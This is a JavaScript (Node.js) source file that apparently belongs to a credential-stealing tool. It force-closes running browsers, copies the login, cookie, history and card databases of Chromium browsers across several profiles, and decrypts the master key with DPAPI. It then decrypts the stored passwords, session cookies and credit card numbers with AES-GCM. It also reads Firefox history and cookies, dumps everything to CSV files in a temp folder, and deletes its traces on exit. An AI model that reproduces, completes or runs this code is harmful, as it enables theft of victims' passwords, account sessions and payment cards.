const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
const { join, sep } = require('path');
const { randomFileCreator } = require('../util/dir');
const { execSync, exec } = require('child_process');
const { sleep } = require('../util/general');
const { browsers, browsersProcesses } = require('../util/variables');
const fs = require('fs');
const csv = require('csv');
const { getTempFolder } = require('../util/init');
const sqlite3 = require('sqlite3');
const crypto = require('crypto');
const { Dpapi } = require('@primno/dpapi');

const filesToDelete = [];

const decryptKey = (localState) => {
  const encryptedKey = JSON.parse(fs.readFileSync(localState, 'utf8')).os_crypt.encrypted_key;
  const encrypted = Buffer.from(encryptedKey, 'base64').slice(5);
  return Dpapi.unprotectData(Buffer.from(encrypted, 'utf8'), null, 'CurrentUser');
};

const _chrome = (name, path, use, columns, table, rowsNames, filename, profile = 'Default', encrypted) => {
  const originalPath = path;
  path += join(sep, profile, use);
  if (!existsSync(path)) return;

  if (!existsSync(join(getTempFolder(), 'Browsers', name))) mkdirSync(join(getTempFolder(), 'Browsers', name));
  const dbFile = randomFileCreator();
  filesToDelete.push(dbFile);
  try {
    copyFileSync(path, dbFile);
  } catch (e) {
    // File is locked or busy
    return;
  }
  const db = new sqlite3.Database(dbFile);
  const file = join(getTempFolder(), 'Browsers', name, `${filename}.csv`);
  const csvFile = csv.stringify({ columns: rowsNames, header: true });
  const key = decryptKey(join(originalPath, 'Local State'));

  db.serialize(() => {
    db.each(`SELECT ${columns.map((c, i) => `${c} ${rowsNames[i]}`).join(', ')} FROM ${table}`, (err, row) => {
      if (err) throw err;

      if (encrypted && row[encrypted]) {
        let decrypted;
        const encryptedValue = row[encrypted];
        const start = encryptedValue.slice(3, 15);
        const middle = encryptedValue.slice(15, encryptedValue.length - 16);
        const end = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
        decipher.setAuthTag(end);
        decrypted = decipher.update(middle, 'base64', 'utf8') + decipher.final('utf8');

        row[encrypted] = decrypted;
      }
      csvFile.write(row);
    });
  });

  csvFile.pipe(fs.createWriteStream(file)).on('finish', () => {
    db.close();
    csvFile.destroy();
  });
};

const _ff = (path, profile, filename, use, columns, table) => {
  if (!existsSync(join(path, profile, 'key4.db'))) return;
  path = join(path, profile, `${use}.sqlite`);
  if (!existsSync(path)) return;

  const db = new sqlite3.Database(path);
  const file = join(getTempFolder(), 'Browsers', 'Mozilla Firefox', `${filename}.csv`);
  const csvFile = csv.stringify({ columns, header: true });

  db.serialize(() => {
    db.all(`SELECT ${columns.join(', ')} FROM ${table}`, (err, rows) => {
      if (err) return;
      for (const row in rows) csvFile.write(rows[row]);
    });
  });

  csvFile.pipe(fs.createWriteStream(file)).on('finish', () => {
    db.close();
    csvFile.destroy();
  });
};

// TODO: find a way to decrypt Firefox passwords
const firefox = {
  passwords: () => {},
  history: (path, profile) => _ff(path, profile, 'History', 'places', ['url', 'title'], 'moz_places'),
  creditCards: () => {},
  cookies: (path, profile) => _ff(path, profile, 'Cookies', 'cookies', ['host', 'name', 'value'], 'moz_cookies')
};

const chrome = {
  passwords: (name, path, profile) => {
    return _chrome(
      name, path, 'Login Data', ['origin_url', 'username_value', 'password_value'], 'logins',
      ['url', 'username', 'password'], 'Logins', profile, 'password'
    );
  },
  history: (name, path, profile) => {
    return _chrome(
      name, path, 'History', ['url', 'title'], 'urls', ['url', 'title'],
      'History', profile
    );
  },
  creditCards: (name, path, profile) => {
    return _chrome(
      name, path, 'Web Data', ['name_on_card', 'expiration_month', 'expiration_year', 'card_number_encrypted'],
      'credit_cards', ['name', 'expiration_month', 'expiration_year', 'card_number'], 'Credit Cards', profile,
      'card_number'
    );
  },
  cookies: (name, path, profile) => {
    return _chrome(
      name, path, join('Network', 'Cookies'), ['host_key', 'name', 'encrypted_value'], 'cookies',
      ['host', 'name', 'value'], 'Cookies', profile, 'value'
    );
  }
};

const kill = (processes) => {
  return new Promise((resolve) => {
    const tasks = execSync('tasklist').toString();
    processes = processes.filter(task => tasks.includes(task));
    processes.forEach((task) => exec(`taskkill /f /im ${task}.exe`));
    resolve();
  });
};

if (!existsSync(join(getTempFolder(), 'Browsers'))) mkdirSync(join(getTempFolder(), 'Browsers'));
module.exports = new Promise((resolve) => {
  kill(browsersProcesses).then(() => {
    Object.keys(browsers).forEach((browser) => {
      const path = browsers[browser];
      const isFirefox = browser === 'Firefox';
      if (existsSync(path)) {
        if (isFirefox && !existsSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox')))
          mkdirSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox'));
        ['passwords', 'history', 'creditCards', 'cookies'].forEach(fn => {
          (isFirefox ?
            fs.readdirSync(path) :
            ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
          ).forEach(profile => {
            isFirefox ?
              firefox[fn](path, profile) :
              chrome[fn](browser, path, profile);
          });
        });
      }
    });
    resolve();
  });
});

process.on('exit', () => {
  sleep(1000).then(() => filesToDelete.forEach(file => existsSync(file) && rmSync(file)));
});
